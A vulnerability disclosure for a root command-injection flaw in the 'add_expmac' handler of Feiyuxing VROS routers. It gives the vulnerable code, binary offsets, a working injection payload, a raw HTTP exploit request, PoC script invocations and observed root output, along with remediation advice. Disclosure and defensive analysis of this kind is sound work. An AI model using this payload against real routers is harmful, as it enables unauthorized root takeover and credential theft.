# Feiyuxing VROS (VW2100 / VEC10GP) — `add_expmac` OS command injection (root RCE)

An OS command injection vulnerability in the web admin CGI of Feiyuxing
VROS-based routers. A crafted `mac` value is interpolated into a shell
command and executed as **root** — requiring a web session on the latest
firmware and **no authentication at all on earlier builds**.

> Research / educational purpose only. Only test devices you own or are
> explicitly authorized to test.

## Affected products

* Chengdu Feiyuxing Technology (飞鱼星) VW2100 V1.0 / VEC10GP V1.0 (VROS)
* Firmware analyzed: `B-MB3W202-210825-r11775` (session-gated)
* Earlier firmware builds: no session gate → unauthenticated
* Other VROS builds sharing the `webserver` CGI may be affected

Vulnerable component: `var/html/webserver` (MIPS32r2 LE, stripped, uClibc,
md5 `78600a56f7f6589f2640693e6f33df9c`), served by a vendor-patched
thttpd that dispatches every `*.cgi` request to this CGI binary, passing
the URL script name (without `.cgi`) as `argv[1]`.

## Vulnerability

Endpoint: `POST /send_order.cgi?parameter=add_expmac`, JSON field `mac`.

```c
/* add_expmac handler, sub_4DB5D0 */
mac = cJSON_GetObjectItem(root, "mac")->valuestring;
sprintf(cmd, "cat %s|grep %s|wc -l", "/disk/conf/nbmac.cfg", mac);
system_operate(cmd, out);       /* popen() internally */
```

The `mac` value is fully attacker-controlled and receives no escaping.
A payload such as `;id> /var/html/fx_cmd_output.txt;#` terminates the
intended pipeline, executes an arbitrary command, and comments out the
trailing `|wc -l`. Because the CGI runs as **root**, the injected command
executes with root privileges. The command output is written into the
web root (`/var/html/`) and can be fetched over HTTP — the patched
thttpd serves non-`.cgi` files statically.

Key locations:

| Offset | Meaning |
|---|---|
| `0x4DB5D0` | `add_expmac` handler |
| `0x4DB89C` | `sprintf(cmd, "cat %s\|grep %s\|wc -l", "/disk/conf/nbmac.cfg", mac)` |
| `0x4DB8C4` | `system_operate(cmd, out)` call |
| `0x40DF1C` | `popen()` inside `system_operate()` |

### Authentication / reachability

* **r11775**: `/send_order.cgi` is gated by a session cookie
  (`hash_key=..,session_id=..`); without it the request is redirected to
  `login.html`. The handler itself still performs no validation.
* **Earlier builds**: the `send_order` endpoint has no session gate, so
  the same request is an unauthenticated root RCE.

## PoC

```bash
# r11775: login first, or reuse an existing session cookie
python3 poc_add_expmac.py <IP> <PORT> -p '<password>' -c 'id'
python3 poc_add_expmac.py <IP> <PORT> --cookie 'hash_key=..,session_id=..' -c 'id'

# earlier builds: unauthenticated
python3 poc_add_expmac.py <IP> <PORT> -c 'id'
```

Raw request:

```http
POST /send_order.cgi?parameter=add_expmac HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: hash_key=..,session_id=..

{"mac":";id> /var/html/fx_cmd_output.txt;#"}
```

Observed result (emulation of the unmodified r11775 firmware):

```
{"type":1,"msg":"ok"}

# on the target:
$ cat /var/html/fx_cmd_output.txt
uid=0(root) gid=0(root)

# or simply over HTTP:
$ curl -s http://<TARGET>:<PORT>/fx_cmd_output.txt
uid=0(root) gid=0(root)
```

The PoC script is dependency-free (raw sockets) and performs the inject +
HTTP fetch workflow automatically.

## Impact

Arbitrary shell commands execute **as root** on the router:
full device takeover, theft of configuration and administrator
credentials, persistent backdooring, traffic interception, and use as a
network pivot. On earlier builds no authentication is required.

## Remediation

* Validate the `mac` argument as a proper MAC address before use.
* Never build shell command strings from request data — use `execve()`
  with an argument vector instead of `system()`/`popen()`.
* Audit the whole `add_expmac` / `swifi_*` handler family (siblings share
  the same pattern).
* Restrict the web admin port to the LAN.

## Credit

Discovered by `C0KE`. CVE requested (reference pending).

## Timeline

* 2026-10-15 — vulnerability identified and statically analyzed
* 2026-10-16 — dynamic verification (session-gated on r11775; root
  command execution confirmed)
* 2026-10-16 — prepared for public release; CVE requested
